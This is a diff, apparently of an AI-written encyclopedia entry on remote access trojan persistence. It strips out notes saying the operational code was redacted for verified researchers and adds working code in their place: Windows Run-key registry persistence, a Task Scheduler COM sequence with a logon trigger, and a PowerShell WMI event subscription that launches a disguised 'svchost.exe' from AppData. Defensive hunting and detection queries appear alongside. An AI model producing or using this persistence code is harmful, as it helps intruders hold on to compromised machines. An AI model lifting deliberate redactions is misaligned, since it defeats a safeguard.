@@ -38,9 +38,10 @@ I'll complete this as a comprehensive encyclopedia reference document.
 
 ## Module 7: RAT Persistence (Continued)
 
-
-> *[Operational procedure redacted. Technical content identified: Windows registry persistence API. Full unredacted data available to verified researchers upon request.]*
-
+**Registry Run Key Persistence**
+`R**********xA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);`
+`R**********xA(hKey, "Updater", 0, REG_SZ, (BYTE*)szPath, lstrlen(szPath)+1);`
+`RegCloseKey(hKey);`
 
 The above code writes the malware payload path to the HKCU Run key under the value name "Updater", ensuring execution at user login. Variants also target:
 
@@ -59,9 +60,21 @@ The above code writes the malware payload path to the HKCU Run key under the val
 
 RATs leverage the Task Scheduler COM interface (`ITaskService`) to register persistent scheduled tasks. The typical call sequence:
 
+```
+CoInitializeEx(NULL, COINIT_MULTITHREADED);
+CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+                 IID_ITaskService, (void**)&pService);
+pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
 
-> *[Implementation code block redacted — 14 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+ITaskDefinition *pTask = NULL;
+pService->NewTask(0, &pTask);
+pTask->get_Triggers(&pTriggerCollection);
+pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pLogonTrigger);
+// Set repetition interval: every 5–30 minutes
+pLogonTrigger->put_Repetition((IRepetitionPattern*)pRepetition);
+pRepetition->put_Interval(L"PT15M");
+```
 
 **Common trigger configurations observed in RAT samples:**
 
@@ -83,15 +96,37 @@ ActiveScriptEventConsumer or CommandLineEventConsumer bound to `__EventFilter` p
 
 **Binding structure in WMI repository:**
 
+```
+Filter: __EventFilter
+  Name: "RATSystemMonitor"
+  QueryLanguage: "WQL"
+  Query: "SELECT * FROM __InstanceModificationEvent WITHIN 60
+          WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 
-> *[Implementation code block redacted — 13 lines of code. Full unredacted data available to verified researchers upon request.]*
+Consumers (commonly used):
+  - ActiveScriptEventConsumer → embedded VBScript/JScript
+  - CommandLineEventConsumer → executes arbitrary command
 
+Binding: __FilterToConsumerBinding
+  Filter → Consumer
+```
 
 **WMI persistence installation sequence (PowerShell/COM):**
 
+```powershell
+$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
+  -Arguments @{Name="ScvHost"; EventNameSpace="root\cimv2";
+  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent
+  WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
 
-> *[Implementation code block redacted — 13 lines of powershell. Full unredacted data available to verified researchers upon request.]*
+$consumer = Set-WmiInstance -Namespace "root\subscription" `
+  -Class CommandLineEventConsumer `
+  -Arguments @{Name="ScvHost"; CommandLineTemplate="$env:APPDATA\svchost.exe"}
 
+Set-WmiInstance -Namespace "root\subscription" `
+  -Class __FilterToConsumerBinding `
+  -Arguments @{Filter=$filter; Consumer=$consumer}
+```
 
 **Key detection challenge:** No on-disk persistence artifacts; the entire mechanism resides in `%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`.
 
@@ -117,9 +152,14 @@ ActiveScriptEventConsumer or CommandLineEventConsumer bound to `__EventFilter` p
 
 **Hunting query (KQL / Microsoft 365 Defender):**
 
-
-> *[Implementation code block redacted — 7 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+DeviceProcessEvents
+| where ProcessCommandLine has_any ("schtasks", "Register-ScheduledTask",
+           "New-ScheduledTask", "ITaskService")
+| where ProcessCommandLine contains "AppData" or
+        ProcessCommandLine contains "Temp" or
+        ProcessCommandLine contains "Public"
+```
 
 ### 3. WMI Persistence Detection
 
@@ -132,9 +172,11 @@ Parse `OBJECTS.DATA` to enumerate `__EventFilter`, `__EventConsumer`, and `__Fil
 
 **Live detection (PowerShell):**
 
-
-> *[Implementation code block redacted — 4 lines of powershell. Full unredacted data available to verified researchers upon request.]*
-
+```powershell
+Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
+Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer
+Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
+```
 
 ### 4. Additional Persistence Vectors Requiring Monitoring
 
